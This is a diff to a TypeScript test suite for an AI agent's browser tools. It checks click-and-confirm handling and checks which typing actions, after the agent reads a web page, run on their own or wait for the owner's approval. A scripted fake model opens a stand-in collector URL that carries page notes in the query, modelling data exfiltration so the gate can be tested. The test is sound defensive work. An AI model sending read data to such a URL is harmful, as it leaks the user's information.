@@ -21,6 +21,13 @@ const BROWSE: Array<[string, object[]]> = [
   ["go to t1", [{ url: "https://example.com/t1", tab: "t1" }]],
 ];
 
+/** Typing after reading a page, by cue: into the tab of a local dev server, a website, or the owner's Chrome. */
+const TYPE_IN: Array<[string, string]> = [
+  ["type on my app", "t9"],
+  ["type on the site", "t1"],
+  ["type in chrome", "c7"],
+];
+
 /** The model the scripted calls report: one that reads images unless a test says otherwise. */
 let model = "fake/gpt-4o";
 let requestedFile: { path: string; sha256: string } | undefined;
@@ -28,6 +35,8 @@ const llm = scriptedLlm((req, { said, afterTool }) => {
   const looks = req.messages.filter((m) => m.role === "tool").length;
   if (said.includes("look six times") && looks < 6)
     return { ...callTool(`l${looks}`, "browser_snapshot", { tab: "t1" }), model };
+  if (said.includes("delete and confirm") && looks < 2)
+    return { ...callTool(`c${looks}`, "browser_click", { tab: "t1", ref: looks ? "dialog-ok" : "e1" }), model };
   const browse = BROWSE.find(([cue]) => said.includes(cue))?.[1][looks];
   if (browse) return { ...callTool(`b${looks}`, "browser_open", browse), model };
   if (said.includes("read then send") && looks < 2)
@@ -35,6 +44,14 @@ const llm = scriptedLlm((req, { said, afterTool }) => {
       ...(looks
         ? callTool("s1", "browser_open", { url: "https://collector.example.net/p?d=notes" })
         : callTool("s0", "browser_text", { tab: "t1" })),
+      model,
+    };
+  const typeIn = TYPE_IN.find(([cue]) => said.includes(cue))?.[1];
+  if (typeIn && looks < 2)
+    return {
+      ...(looks
+        ? callTool("ty1", "browser_type", { tab: typeIn, ref: "e1", text: "Buy milk" })
+        : callTool("ty0", "browser_text", { tab: "t1" })),
       model,
     };
   if (!afterTool && said.includes("evaluate file") && requestedFile)
@@ -78,6 +95,8 @@ const tabs = [
 ];
 const opened: string[] = [];
 const navigated: Array<{ tab: string; url: string }> = [];
+const clicked: string[] = [];
+const typed: Array<Record<string, unknown>> = [];
 /** What the fake tab's screenshot returns next. */
 let shot = JPEG;
 
@@ -102,6 +121,15 @@ before(async () => {
       const { tab, url } = params as { tab: string; url: string };
       navigated.push({ tab, url });
       return { url, title: "Page" };
+    }
+    if (method === "browser.click") {
+      const { ref } = params as { ref: string };
+      clicked.push(ref);
+      return { ok: true, url: "https://example.com/", ...(ref === "e1" ? { dialog: "confirm" } : {}) };
+    }
+    if (method === "browser.type") {
+      typed.push(params as Record<string, unknown>);
+      return { ok: true, url: tabs.find((t) => t.tab === (params as { tab: string }).tab)?.url ?? "" };
     }
     if (method === "browser.text")
       return {
@@ -224,6 +252,20 @@ test("browser_snapshot waits the seconds asked before reading the page", async (
   assert.equal(snapshots.length, 1);
   assert.ok((snapshots[0] ?? 0) - sent >= 1000, "read after the wait");
   assert.match(String(llm.calls.at(-1)?.messages.findLast((m) => m.role === "tool")?.content), /Send/);
+});
+
+test("a click that opens a confirm dialog says so, and the agent answers it with its ref", async () => {
+  const thread = (await env.client.call("threads.create", { kind: "loose", agent_id: "superagent" })).id;
+  await env.client.call("threads.send", { thread, text: "delete and confirm" });
+  await env.settle(thread);
+  assert.deepEqual(clicked, ["e1", "dialog-ok"]);
+  const results =
+    llm.calls
+      .at(-1)
+      ?.messages.filter((m) => m.role === "tool")
+      .map((m) => String(m.content)) ?? [];
+  assert.match(results[0] ?? "", /opened a confirm dialog the page waits on: browser_snapshot shows it/);
+  assert.match(results[1] ?? "", /clicked dialog-ok/);
 });
 
 test("browser_snapshot shows the model a picture of the tab, not the chat", async () => {
@@ -353,4 +395,47 @@ test("a URL that carries data after a page was read waits, and the card says why
   assert.match(prompt, /URL/);
   assert.match(prompt, /lleva datos/);
   assert.match(prompt, /contenido de una web/);
+});
+
+test("typing on the agent's own local app after reading a page runs unasked, limited to this computer", async () => {
+  // A dev server on this computer: what is typed there stays on this machine (DECISIONS.md#d-212).
+  tabs.push({
+    tab: "t9",
+    url: "http://127.0.0.1:8127/notes/create",
+    title: "Notes",
+    profile: "shared",
+    control: { kind: "idle" },
+  });
+  typed.length = 0;
+  const thread = (await env.client.call("threads.create", { kind: "loose", agent_id: "superagent" })).id;
+  await env.client.call("threads.send", { thread, text: "type on my app" });
+  await env.settle(thread);
+  assert.deepEqual((await env.client.call("runs.pending", { thread })).inputs, []);
+  // The browser re-checks the page itself as it types: a page that moved on meanwhile gets nothing.
+  assert.deepEqual(typed, [
+    { tab: "t9", ref: "e1", text: "Buy milk", submit: false, by: "superagent", local_only: true },
+  ]);
+});
+
+test("typing on a website, in the owner's Chrome, or outside Auto after reading a page waits for the owner", async () => {
+  try {
+    for (const cue of ["type on the site", "type in chrome", "type on my app"]) {
+      // Accept edits asks before a command that changes something, so typing on a local page asks too.
+      if (cue === "type on my app")
+        await env.client.call("agents.update", { agent: "superagent", autonomy: "accept_edits" });
+      typed.length = 0;
+      const thread = (await env.client.call("threads.create", { kind: "loose", agent_id: "superagent" })).id;
+      await env.client.call("threads.send", { thread, text: cue });
+      const input = await waitFor(
+        async () => (await env.client.call("runs.pending", { thread })).inputs[0],
+        `the card for ${cue}`,
+      );
+      assert.equal(input.tool, "browser_type", cue);
+      await env.client.call("runs.respond", { input: input.id, decision: "deny" });
+      await env.settle(thread);
+      assert.deepEqual(typed, [], cue);
+    }
+  } finally {
+    await env.client.call("agents.update", { agent: "superagent", autonomy: "auto" });
+  }
 });
